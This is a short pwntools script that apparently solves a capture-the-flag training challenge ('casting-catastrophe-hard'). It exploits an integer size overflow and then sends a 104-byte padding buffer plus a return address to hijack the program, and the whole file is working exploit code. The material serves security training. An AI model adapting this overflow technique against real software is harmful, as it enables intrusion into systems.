from pwn import *

p = process('/challenge/casting-catastrophe-hard')

p.recvuntil('Number of payload records to send:')
p.sendline(b'65536')

p.recvuntil('Size of each payload record:')
p.sendline(b'65536')

payload = b'a' * 104 + p64(0x4020d7) 

#p.recvline('Send your payload')
p.sendline(payload)

p.interactive()

